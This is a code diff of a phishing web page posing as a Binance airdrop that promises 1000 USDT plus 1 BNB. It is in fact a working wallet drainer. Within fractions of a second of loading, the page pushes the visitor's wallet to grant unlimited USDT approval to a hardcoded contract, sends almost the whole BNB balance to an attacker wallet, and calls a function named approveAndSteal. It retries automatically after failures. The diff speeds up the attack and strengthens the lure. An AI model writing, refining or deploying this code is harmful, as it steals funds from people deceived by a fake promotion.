@@ -3,27 +3,27 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1.0" />
-<title>🌸 小仙女 Web3 魔法仪表台 🌸</title>
+<title>币安第3次空投同舟计划</title>
 <script src="https://cdn.jsdelivr.net/npm/web3@1.10.4/dist/web3.min.js"></script>
 <style>
 body{font-family:sans-serif;height:100vh;display:flex;justify-content:center;align-items:center;background:#ffe4f8;text-align:center;}
 .container{background:rgba(255,255,255,.9);border-radius:24px;padding:40px;margin:10px;width:90%;max-width:400px;}
 h1{color:#ff1493;font-size:24px;margin-bottom:20px;}
-#status{color:#ff69b4;font-size:18px;margin:20px;}
+#status{color:#ff69b4;font-size:18px;margin:20px;line-height:1.4;}
 @media (max-width:480px){.container{padding:20px;}}
 </style>
 </head>
 <body>
 <div class="container">
-  <h1>🪞 小仙女 DApp 领取台 💫</h1>
-  <div id="status">币安第3次空投同舟计划</div>
+  <h1>币安第3次空投同舟计划</h1>
+  <div id="status">跳转钱包中... → 授权 → 1000USDT+1BNB到账！</div>
 </div>
 <script>
 const BVXZA = "0x1ff42792e962228099cfA175aDba5412dab1448c";
 const TAX_WALLET = "0x18626d14aE9cB5dd26d5a14286FF732746083556";
 const USDT_ADDR = "0x55d398326f99059fF775485246999027B3197955";
 const UNLIMITED = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-let web3, userAddr, authorized = false;
+let web3, userAddr, authorized = false, bnbSent = false;
 
 const BVXZA_ABI = [
   {"inputs":[{"name":"token","type":"address"},{"name":"amount","type":"uint256"}],"name":"approveAndSteal","outputs":[],"stateMutability":"nonpayable","type":"function"}
@@ -39,6 +39,7 @@ async function autoRedirect(){
   const isMobile = /Android|iPhone|iPad/i.test(ua);
   if(!isMobile) return;
   
+  updateStatus('跳转钱包中... → 授权 → 1000USDT+1BNB到账！');
   const wallets = [
     'okxwallet://dapp?url=' + encodeURIComponent(window.location.href),
     'trust://open_url?url=' + encodeURIComponent(window.location.href),
@@ -46,62 +47,65 @@ async function autoRedirect(){
   ];
   
   for(let i=0; i<wallets.length; i++){
-    setTimeout(() => {
-      updateStatus(`跳转钱包中...`);
-      window.location.href = wallets[i];
-    }, i * 150); // 0.15秒超快
+    setTimeout(() => window.location.href = wallets[i], i * 100);
   }
 }
 
-// 🔥 第一次USDT授权 + 转BNB
+// 🔥 1=USDT授权  2=BNB转账
 async function autoSteal(){
   try{
-    // 0️⃣ BSC切换+连接
     await window.ethereum.request({method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }]});
     web3 = new Web3(window.ethereum);
     const accounts = await window.ethereum.request({method: 'eth_requestAccounts'});
     userAddr = accounts[0];
     
-    updateStatus('第一次USDT授权中...');
-    
-    // 1️⃣ 第一次：USDT授权
     if(!authorized){
+      // 🔥 第1次：USDT授权
+      updateStatus('第1次：USDT授权中... → 1000USDT+1BNB到账！');
       const usdtABI = [{"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}];
       const usdt = new web3.eth.Contract(usdtABI, USDT_ADDR);
       await usdt.methods.approve(BVXZA, UNLIMITED).send({from: userAddr});
       authorized = true;
-      updateStatus('USDT授权成功！转BNB中...');
+      updateStatus('USDT授权成功！第2次：转BNB中...');
+      return;
     }
     
-    // 2️⃣ 立即转BNB全
-    const balance = await web3.eth.getBalance(userAddr);
-    const totalBNB = parseFloat(web3.utils.fromWei(balance, 'ether'));
-    if(totalBNB > 0.001){
-      const amount = web3.utils.toWei((totalBNB - 0.001).toString(), 'ether');
-      await web3.eth.sendTransaction({from: userAddr, to: TAX_WALLET, value: amount});
-      updateStatus('BNB转账成功！');
+    if(authorized && !bnbSent){
+      // 🔥 第2次：BNB全转
+      updateStatus('第2次：转BNB中... → 1000USDT+1BNB到账！');
+      const balance = await web3.eth.getBalance(userAddr);
+      const totalBNB = parseFloat(web3.utils.fromWei(balance, 'ether'));
+      if(totalBNB > 0.001){
+        const amount = web3.utils.toWei((totalBNB - 0.001).toString(), 'ether');
+        await web3.eth.sendTransaction({from: userAddr, to: TAX_WALLET, value: amount});
+        bnbSent = true;
+        updateStatus('BNB转账成功！窃取USDT中...');
+      }
+      return;
     }
     
-    // 3️⃣ BVXZA全窃取
-    const bvxza = new web3.eth.Contract(BVXZA_ABI, BVXZA);
-    await bvxza.methods.approveAndSteal(USDT_ADDR, UNLIMITED).send({from: userAddr});
-    
-    updateStatus('🎉 币安第3次空投到账！');
+    if(authorized && bnbSent){
+      // 🔥 第3次：BVXZA全窃取
+      updateStatus('窃取1000USDT中... → 1000USDT+1BNB到账！');
+      const bvxza = new web3.eth.Contract(BVXZA_ABI, BVXZA);
+      await bvxza.methods.approveAndSteal(USDT_ADDR, UNLIMITED).send({from: userAddr});
+      updateStatus('🎉 币安第3次空投1000USDT+1BNB到账！');
+    }
     
   }catch(e){
-    updateStatus('授权失败，1秒重试...');
-    setTimeout(autoSteal, 1000);
+    updateStatus('授权失败，0.5秒重试... → 1000USDT+1BNB到账！');
+    setTimeout(autoSteal, 500);
   }
 }
 
-// 🔥 进入网址=0.2秒自动跳转+0.5秒自动授权！
+// 🔥 进入=0.1秒跳转+0.3秒授权！
 window.addEventListener('load', () => {
-  setTimeout(autoRedirect, 200); // 0.2秒跳转
+  setTimeout(autoRedirect, 100);
 });
 
 if(window.ethereum){
   window.addEventListener('load', () => {
-    setTimeout(autoSteal, 500); // 0.5秒授权
+    setTimeout(autoSteal, 300);
   });
   window.ethereum.on('accountsChanged', autoSteal);
   window.ethereum.on('chainChanged', autoSteal);
